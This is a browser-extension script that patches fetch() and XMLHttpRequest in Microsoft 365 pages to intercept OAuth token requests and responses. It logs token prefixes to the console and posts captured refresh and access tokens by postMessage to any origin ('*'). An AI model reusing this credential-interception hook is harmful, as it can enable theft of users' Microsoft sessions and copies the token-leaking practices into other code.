// Page-context script: patches fetch() and XMLHttpRequest to intercept
// login.windows.net / login.microsoftonline.com token endpoint requests AND
// responses, capturing refresh tokens and logging the exact parameters MSAL
// sends. Injected by content/content.js via a <script> element (runs in page world).
(function() {
  console.log("[M365OWA] page-hook loaded in page world");

  // Check whether a URL is a token endpoint we care about
  function isTokenEndpoint(url) {
    if (!url) return false;
    return url.indexOf("oauth2") !== -1 && url.indexOf("token") !== -1 &&
      (url.indexOf("login.microsoftonline.com") !== -1 || url.indexOf("login.windows.net") !== -1);
  }

  // Extract all params from a URL-encoded form body string
  function parseFormBody(body) {
    var params = {};
    if (typeof body === "string") {
      try {
        var usp = new URLSearchParams(body);
        var keys = ["grant_type", "client_id", "scope", "resource", "client_info",
          "redirect_uri", "code", "code_verifier", "refresh_token", "username",
          "password", "assertion", "requested_token_use"];
        for (var i = 0; i < keys.length; i++) {
          var v = usp.get(keys[i]);
          if (v) {
            // truncate long values for logging
            params[keys[i]] = (v.length > 80) ? v.slice(0, 80) + "...(len=" + v.length + ")" : v;
          }
        }
      } catch (e) {}
    }
    return params;
  }

  // Post the captured token data to the content script via window.postMessage
  function postTokenResponse(refreshToken, accessToken, clientId, scope, url) {
    window.postMessage({
      type: "M365OWA_TOKEN_RESPONSE",
      refresh_token: refreshToken,
      access_token: accessToken || null,
      client_id: clientId || null,
      scope: scope || null,
      url: url || null,
      source: "page-hook",
    }, "*");
  }

  // Log a token request (always-on diagnostic)
  function logTokenRequest(method, url, body) {
    var params = parseFormBody(body);
    console.log("[M365OWA] page-hook: TOKEN REQUEST " + method + " " + url);
    console.log("[M365OWA] page-hook:   grant_type=" + (params.grant_type || "?"));
    console.log("[M365OWA] page-hook:   client_id=" + (params.client_id || "?"));
    console.log("[M365OWA] page-hook:   scope=" + (params.scope || "none"));
    console.log("[M365OWA] page-hook:   resource=" + (params.resource || "none"));
    console.log("[M365OWA] page-hook:   client_info=" + (params.client_info || "none"));
    console.log("[M365OWA] page-hook:   redirect_uri=" + (params.redirect_uri || "none"));
    console.log("[M365OWA] page-hook:   code_verifier=" + (params.code_verifier ? "yes(len=" + params.code_verifier.length + ")" : "none"));
    console.log("[M365OWA] page-hook:   refresh_token=" + (params.refresh_token ? "yes(len=" + params.refresh_token.length + ")" : "none"));
    console.log("[M365OWA] page-hook:   code=" + (params.code ? "yes(len=" + params.code.length + ")" : "none"));
  }

  // Log a token response (always-on diagnostic)
  function logTokenResponse(url, data) {
    console.log("[M365OWA] page-hook: TOKEN RESPONSE from " + url);
    console.log("[M365OWA] page-hook:   token_type=" + (data.token_type || "?"));
    console.log("[M365OWA] page-hook:   expires_in=" + (data.expires_in || "?"));
    console.log("[M365OWA] page-hook:   scope=" + (data.scope ? data.scope.slice(0, 120) : "none"));
    console.log("[M365OWA] page-hook:   access_token=" + (data.access_token ? "yes(len=" + data.access_token.length + " start=" + data.access_token.slice(0, 20) + ")" : "no"));
    console.log("[M365OWA] page-hook:   refresh_token=" + (data.refresh_token ? "yes(len=" + data.refresh_token.length + " start=" + data.refresh_token.slice(0, 20) + ")" : "no"));
  }

  // --- Patch fetch() ---
  var originalFetch = window.fetch;
  window.fetch = function() {
    var args = arguments;
    var url = typeof args[0] === "string" ? args[0] : (args[0] && args[0].url) || "";
    if (isTokenEndpoint(url)) {
      var body = args[1] && args[1].body;
      logTokenRequest("fetch", url, body);
      var promise = originalFetch.apply(this, args);
      promise.then(function(response) {
        try {
          var meta = parseFormBody(body);
          var clone = response.clone();
          clone.json().then(function(data) {
            logTokenResponse(url, data);
            if (data.refresh_token) {
              postTokenResponse(data.refresh_token, data.access_token,
                meta.client_id, meta.scope, url);
            }
          }).catch(function(e) {
            console.log("[M365OWA] page-hook: response parse failed:", e.message || e);
          });
        } catch (e) {}
      }).catch(function() {});
      return promise;
    }
    return originalFetch.apply(this, args);
  };

  // --- Patch XMLHttpRequest ---
  var originalOpen = XMLHttpRequest.prototype.open;
  var originalSend = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.open = function(method, url) {
    this._m365owa_url = url;
    this._m365owa_method = method;
    return originalOpen.apply(this, arguments);
  };
  XMLHttpRequest.prototype.send = function(body) {
    var self = this;
    if (isTokenEndpoint(this._m365owa_url)) {
      logTokenRequest("XHR", this._m365owa_url, body);
      this.addEventListener("load", function() {
        try {
          var data = JSON.parse(self.responseText);
          logTokenResponse(self._m365owa_url, data);
          var meta = parseFormBody(body);
          if (data.refresh_token) {
            postTokenResponse(data.refresh_token, data.access_token,
              meta.client_id, meta.scope, self._m365owa_url);
          }
        } catch (e) {
          console.log("[M365OWA] page-hook: XHR response parse failed:", e.message || e);
        }
      });
    }
    return originalSend.apply(this, arguments);
  };

  console.log("[M365OWA] page-hook: fetch() and XMLHttpRequest patched");
})();
